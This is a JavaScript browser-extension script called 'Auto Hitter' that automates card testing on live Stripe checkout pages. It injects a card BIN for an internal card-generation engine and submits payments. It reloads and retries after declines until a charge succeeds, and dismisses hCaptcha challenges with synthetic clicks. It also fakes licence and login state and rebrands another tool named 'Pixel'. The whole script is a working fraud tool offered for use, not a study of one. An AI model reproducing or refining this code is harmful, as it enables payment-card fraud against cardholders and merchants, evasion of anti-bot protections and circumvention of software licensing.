/**
 * Auto Hitter - Checkout Bypass & Branding Cleanup
 * This script ensures the extension functions without license/login checks on checkout pages.
 */
(function() {
    const DEBUG = false;
    if (DEBUG) console.log("[Auto Hitter] Bypass script loaded.");

    // Initial state cleanup
    const forceState = () => {
        try {
            chrome.storage.local.set({
                'isLoggedIn': true,
                'isLogged': true,
                'license': 'AUTO_HITTER_UNLOCKED',
                'licenseKey': 'AUTO_HITTER_UNLOCKED',
                'status': 'ACTIVE',
                'auth': true,
                'userRole': 'premium'
            });
        } catch (e) {
            // Might fail if extension context is lost, but usually fine in content scripts
        }
    };

    // DOM cleanup function
    const sanitizeUI = () => {
        // 1. Force hide login screens (backup for CSS)
        const selectorsToHide = ['.login-screen', '.pixel-error-overlay', '#loginWrap', '.userid-section', '.otp-section'];
        selectorsToHide.forEach(sel => {
            const el = document.querySelector(sel);
            if (el) {
                el.style.setProperty('display', 'none', 'important');
                el.remove(); // Aggressive removal
            }
        });

        // 2. Force show main content
        const selectorsToShow = ['.card-generator-overlay .modal-content', '#app'];
        selectorsToShow.forEach(sel => {
            const el = document.querySelector(sel);
            if (el) {
                el.classList.remove('hidden');
                el.style.setProperty('display', 'block', 'important');
                el.style.setProperty('opacity', '1', 'important');
                el.style.setProperty('visibility', 'visible', 'important');
            }
        });

        // 3. Dynamic branding replacement (Pixel -> Auto)
        const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
        let node;
        while (node = walker.nextNode()) {
            if (node.textContent.includes('Pixel')) {
                node.textContent = node.textContent
                    .replace(/PixelAutohit/g, 'Auto Hitter')
                    .replace(/Pixel Hitter/g, 'Auto Hitter')
                    .replace(/Pixel/g, 'Auto');
            }
        }

        // 4. Update title in the card header if found
        const panelTitle = document.querySelector('.panel-title');
        if (panelTitle && panelTitle.textContent.includes('Pixel')) {
            panelTitle.textContent = 'Auto Hitter';
        }
    };


    // 5. hCaptcha Detection & Auto-Dismiss/Reload
    const checkCaptcha = () => {
        // Detect hCaptcha challenge iframe or common containers
        const challengeIframe = document.querySelector('iframe[title*="hCaptcha challenge"]') || 
                                document.querySelector('iframe[src*="hcaptcha.com/getcaptcha"]');
        const hcaptchaBox = document.querySelector('.h-captcha') || document.querySelector('#h-captcha');
        
        let isVisible = false;
        if (challengeIframe && challengeIframe.offsetParent !== null) isVisible = true;
        if (hcaptchaBox && hcaptchaBox.offsetParent !== null) isVisible = true;

        if (isVisible && !window._handlingCaptcha) {
            window._handlingCaptcha = true;
            console.log("[Auto Hitter] ক্যাপচা পাওয়া গেছে। ফাঁকা জায়গায় সার্জিক্যাল ক্লিকের চেষ্টা করা হচ্ছে...");
            
            const attemptSurgicalDismiss = () => {
                try {
                    const challenge = document.querySelector('iframe[title*="hCaptcha challenge"]') || 
                                     document.querySelector('iframe[src*="hcaptcha.com/getcaptcha"]');

                    let clickX = 10, clickY = 10; // Default to top-left

                    if (challenge) {
                        const rect = challenge.getBoundingClientRect();
                        // Find a point outside the challenge rect
                        if (rect.left > 50) {
                            clickX = rect.left - 30;
                            clickY = rect.top + (rect.height / 2);
                        } else if (window.innerWidth - rect.right > 50) {
                            clickX = rect.right + 30;
                            clickY = rect.top + (rect.height / 2);
                        } else if (rect.top > 50) {
                            clickX = window.innerWidth / 2;
                            clickY = rect.top - 30;
                        }
                    }

                    // Perform a high-fidelity click sequence on the calculated point
                    const target = document.elementFromPoint(clickX, clickY) || document.body;
                    const eventOptions = { bubbles: true, cancelable: true, view: window, clientX: clickX, clientY: clickY };
                    
                    ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click'].forEach(type => {
                        target.dispatchEvent(new MouseEvent(type, eventOptions));
                        if (type.startsWith('pointer')) {
                            target.dispatchEvent(new PointerEvent(type, eventOptions));
                        }
                    });

                    // Also hit the absolute corners
                    [ {x:2, y:2}, {x:window.innerWidth-2, y:2} ].forEach(p => {
                        const t = document.elementFromPoint(p.x, p.y) || document.body;
                        t.click();
                        t.dispatchEvent(new MouseEvent('click', { bubbles: true, clientX: p.x, clientY: p.y }));
                    });

                    // Escape simulation
                    const esc = (type) => document.dispatchEvent(new KeyboardEvent(type, { key: 'Escape', code: 'Escape', keyCode: 27, which: 27, bubbles: true }));
                    ['keydown', 'keyup'].forEach(esc);

                } catch (e) { console.error(e); }
            };

            // Aggressive surgical loop
            for(let i=0; i<8; i++) {
                setTimeout(attemptSurgicalDismiss, i * 600);
            }

            setTimeout(() => { window._handlingCaptcha = false; }, 8000);
        }
    };

    // 6. Run intervals
        // 6. Mini App Integration & Auto-Hit Logic
        // 6. Mini App Integration & Auto-Hit Logic
    const handleAutoHit = async () => {
        try {
            const data = await chrome.storage.local.get(["maActive", "maBin", "maCount", "maTries", "maUrl"]);
            if (!data || !data.maActive) return;

            const report = (text, status = "") => {
                try { chrome.runtime.sendMessage({ type: "MA_STATUS", text: text, status: status }); } catch(e){}
            };

            // Only run on the specific target URL provided in the Mini App
            if (!window.location.href.includes(data.maUrl) && !window.location.href.includes("pay/cs_live")) return;

            if (data.maTries >= data.maCount) {
                report("Reached max retries (" + data.maCount + "). Stopping.", "error");
                chrome.storage.local.set({ maActive: false });
                return;
            }

            report("Hit active. Try " + (data.maTries + 1) + "/" + data.maCount);
            
            // Force injection of the specific BIN from the Mini App
            chrome.storage.local.set({ 
                "quickBin": data.maBin, 
                "maTries": data.maTries + 1,
                "currentBin": data.maBin 
            });

            report("BIN " + data.maBin + " injected. Forcing filler engine...");

            // Logic to find and fill the card fields
            const fillCard = () => {
                const cardInput = document.querySelector("#cardNumber") || document.querySelector("input[name='cardnumber']") || document.querySelector("input[autocomplete='cc-number']");
                if (cardInput) {
                    cardInput.focus();
                    // We don't fill the full number here as the internal engine handles BIN-to-Card generation
                    // But we ensure the internal engine knows which BIN to use
                    report("Card field found. Triggering internal engine...", "success");
                }
            };

            setTimeout(() => {
                fillCard();
                const btn = document.querySelector(".start-btn") || document.querySelector("#maStartBtn") || document.querySelector("button[type='submit']") || document.querySelector("button[class*=\"start\"]");
                if (btn && btn.offsetParent !== null) {
                    btn.click();
                    report("Automation Clicked!", "success");
                }
            }, 3500);
        } catch (e) { console.error("[Auto Hitter] Auto-hit error:", e); }
    };

    forceState();
    sanitizeUI();
    handleAutoHit();
    setInterval(sanitizeUI, 1500);
    setInterval(forceState, 5000);
    setInterval(checkCaptcha, 4000);
    setInterval(handleAutoHit, 12000);


    
    // 7. Sequential Retry Logic (Single Tab)
    const monitorOutcome = () => {
        setInterval(async () => {
            const data = await chrome.storage.local.get(["maActive", "maTries", "maCount"]);
            if (!data.maActive) return;

            // Detect common Stripe error messages
            const errorSelectors = [".FieldError", ".Error", "[role='alert']", ".messaging-message", ".p-Icon--error"];
            let errorFound = false;
            errorSelectors.forEach(sel => {
                const el = document.querySelector(sel);
                if (el && el.innerText.length > 5 && el.offsetParent !== null) errorFound = true;
            });

            if (errorFound && !window._reloading) {
                window._reloading = true;
                const triesLeft = data.maCount - data.maTries;
                console.log("[Auto Hitter] Payment failed. Retries left: " + triesLeft);
                
                if (triesLeft > 0) {
                    setTimeout(() => { location.reload(); }, 4000); // Wait 4s to see error, then reload
                } else {
                    chrome.storage.local.set({ maActive: false });
                    console.log("[Auto Hitter] Max retries reached. Stopping.");
                }
            }

            // Detect success (optional based on site)
            if (window.location.href.includes("success") || window.location.href.includes("thanks")) {
                chrome.storage.local.set({ maActive: false });
                console.log("[Auto Hitter] Hit Success! Session cleared.");
            }
        }, 3000);
    };
    monitorOutcome();
})();

